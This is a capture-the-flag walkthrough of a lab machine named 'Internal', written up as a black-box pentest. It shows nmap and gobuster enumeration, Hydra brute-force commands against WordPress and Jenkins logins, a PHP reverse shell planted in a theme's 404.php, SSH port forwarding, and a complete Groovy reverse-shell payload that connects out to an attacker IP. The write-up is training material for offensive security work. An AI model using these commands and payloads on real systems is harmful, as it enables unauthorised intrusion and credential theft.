# Internal

"The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation":

- User.txt
- Root.txt

## Information

Let's start by performing an nmap scan on the target in order to enumerate its services:

```
nmap $ip -p-
nmap $ip -p 22, 80 -A 
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 17:51 EST
> Nmap scan report for 10.10.106.241
> Host is up (0.045s latency).
>
> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
> |   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
> |_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
> |_http-server-header: Apache/2.4.29 (Ubuntu)
> |_http-title: Apache2 Ubuntu Default Page: It works
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds

Great, two standard open ports: SSH and a Web Server. 

Before checking port 80 out, let us map internal.thm to the ip address of the target

```
echo "$ip internal.thm" >> /etc/hosts
```

> The /etc/hosts file is a plain-text file used by the operating system to map hostnames to IP addresses. It is present in most Unix-like operating systems, including Linux, macOS, and BSD.



## Web Enumeration

Since the landing page of the website showcases the Apache2 Ubuntu Default Page, let us perform web enumeration with GoBuster in order to find some hidden resources.

```
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10
```

![image-20230308190307800](./images/image-20230308190307800.png)

Great, we found a couple of endpoints:

- /blog: Points to a Wordpress Blog (Relevant)
- /wordpress: Redirects to the the Wordpress Blog with a "Oops that page can't be found" (Not relevant)
- /javascript: Forbidden Resource (Not relevant)
- /phpmyadmin: phpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. (Relevant)
- /server-status: Forbidden Resource (Not relevant)

With the information extracted from the enumeration phase performed above let us explore the Wordpress Blog.

> Alternatively you can also use dirbuster or [dirsearch](https://github.com/maurosoria/dirsearch)

## Wordpress Blog

After a thorough inspection of the website we found **one post**, a **wordpress login page** and **one file containing information about the Wordpress version** being used.

1. **Post** (http://internal.thm/blog/index.php/2020/08/03/hello-world/) by the "admin" user which potentially discloses the existence of this user.

   ![image-20230309194754130](./images/image-20230309194754130.png)

2. **Wordpress login page** vulnerable to **username enumeration** which confirms that the admin user exists.

   ![image-20230309195118952](./images/image-20230309195118952.png)

   ![image-20230309195425153](./images/image-20230309195425153.png)

   > We can also further confirm our suspicions by performing enumeration with **wpscan**:
   >
   > ```
   > wpscan --url http://internal.thm/blog -e u
   > ```
   >
   > ![image-20230309200845407](./images/image-20230309200845407.png)
   >
   > Or by accessing the endpoint below (disclosed by wpscan):
   >
   > ```
   > http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
   > ```

   

3. Files containing information regarding the version of Wordpress being used by the web server (5.4.2). They can be found at the bottom of the blog page. 

![image-20230309195655683](./images/image-20230309195655683.png)

![image-20230308190733352](./images/image-20230308190733352.png)

Great! What next? We have some paths we could follow:

- Try to brute force the Wordpress login page with Hydra or Wpscan
- Search for vulnerabilities related to Wordpress version 5.4.2
- Explore the phpmyadmin endpoint



## Brute force Wordpress Login Page

Let us start by performing this step. We should analyze the Post request used for the login and build our Hydra command:

```
hydra internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -l admin -P /usr/share/wordlists/rockyou.txt -f -V 
```

![image-20230309202300906](./images/image-20230309202300906.png)

Alternatively, using wpscan:

```
wpscan --url internal.thm/blog --wordlist /usr/share/wordlists/rockyou.txt --username admin
```

![image-20230309202714151](./images/image-20230309202714151.png)



Great, now we can login to the Wordpress configuration page of the web server.



## Reverse Shell on Wordpress Configuration Page

Now that we have access to this new portion of the website, let us explore and try to identify a way to execute code in order to obtain a reverse shell.

After exploring for a bit I found two interesting findings:

1. Credentials for a user in a private post which were a **rabbit hole purposely placed by the author of the machine!**
2. The possibly to edit php files for Themes being used by Wordpress to deploy the blog page.

Having the possibility to edit these .php files meant we could try to substitute one of these files with code to get a reverse shell. I used [Pentest Monkey's known PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) for this.

I updated the 404.php file changed the port and ip. Finally, I launched a local listener and all i had to do was execute the payload.

There are two ways I found out we are able to execute the 404.php:

- http://internal.thm/wordpress -> Earlier we saw that the /wordpress page pointed to a page not found error which translates to the 404 error, meaning this page executes the 404.php file.
- http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

![image-20230310054621448](./images/image-20230310054621448.png)



## Upgrading Shell and Manual Enumeration



Great, now that we have a working shell we can upgrade it and check what user content we are working with and what other users exist:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami
cat /etc/passwd
```

![image-20230310055632515](./images/image-20230310055632515.png)

We know there is a user **aubreanna** which we want to access its directory to read the user.txt flag. How can we escalate privileges? Let's do some manual enumeration. If we go to the /opt folder we find a text file called **wp-save.txt**

This file contains the user's password and discloses the existence of a jenkins server on port 8080!

```
su aubreanna
```

Change user context and read the flag!

Additionally these credentials also work for SSH.

Additionally in the home directory there is **jenkins.txt** file which states the following:

> Internal Jenkins service is running on 172.17.0.2:8080

172.17.0.2 resembles a docker IP address which could be a clue.

If we ifconfig on the target machine we can see that it is connected to the 172.17.0.0/16 network with an IP address of 172.17.0.1

![image-20230310060847126](./images/image-20230310060847126.png)

Additionally we can netstat to verify that in fact the machine has port 8080 listening which confirms that there is a jenkins server running.

### Method 1

We can access it by forwarding this traffic to our local machine with the command:

```
ssh -L <port>:localhost:8080 aubreanna@<ip>
```

> This means that when you access localhost:<port> on your local machine, the SSH tunnel will forward that traffic to localhost:8080 on the remote server.

After logging in we can go to our browser and type:

```
http://localhost:4445
```

![image-20230310061809629](./images/image-20230310061809629.png)

### Method 2

We can access it by forwarding this traffic to our local machine with the command:

```
ssh -L <port>:172.17.0.2:8080 aubreanna@<ip>
```

Great! Now what? Let's try to bruteforce the credentials once again?



## Jenking Credential Brute force

```
hydra 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt -f -V -s 4445
```

Great! We have the password credentials for the user admin! Let's login.

![image-20230310064201550](./images/image-20230310064201550.png)



We have done another challenge where we had to deal with jenkins and the same concept applies here in order to get a reverse shell. Inside this managing area there is a Groovy Console we can access to execute Groovy Scripts.

Searching the Internet we can easily find [Groovy reverse shell code](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6):

```
String host="10.11.22.157";
int port=4446;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```



Great! We are logged in.



## Enumerating Docker instance

The shell we are working with is very limited and upgrading it with python didn not work, hence we gotta work with what we have.

Typing the `ifconfig` command did not work so alternatively we can check we are in the docker instance at ip address 172.17.0.2 by typing `ip addr`.

![image-20230310072044319](./images/image-20230310072044319.png)

The author simplified our life dropping a note.txt file in the /opt folder once again.

It has root credentials for the first machine we exploited.

Go back to the previous SSH session `su` to root and `cat /root/root.txt`.

We did it! Congrats on exploiting a new machine.
